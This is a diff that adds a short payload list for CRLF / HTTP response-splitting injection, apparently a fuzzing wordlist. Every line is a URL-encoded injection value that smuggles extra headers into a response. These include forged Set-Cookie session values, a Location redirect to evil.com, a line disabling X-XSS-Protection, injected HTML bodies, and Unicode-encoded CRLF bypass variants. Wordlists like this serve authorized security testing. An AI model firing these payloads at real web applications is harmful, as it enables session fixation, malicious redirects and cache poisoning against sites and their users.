@@ -1,0 +1,10 @@
+%0d%0aTest:123
+%0d%0aLocation:%20http://evil.com
+%0d%0aSet-Cookie:%20session=evil
+%0aSet-Cookie:%20session=evil
+%0dSet-Cookie:%20session=evil
+%0d%0aX-XSS-Protection:%200
+%0d%0aContent-Length:%200
+%0d%0a%0d%0a<html>test
+%E5%98%8D%E5%98%8Ahello
+%E5%98%8D%E5%98%8ASet-Cookie:%20session=evil
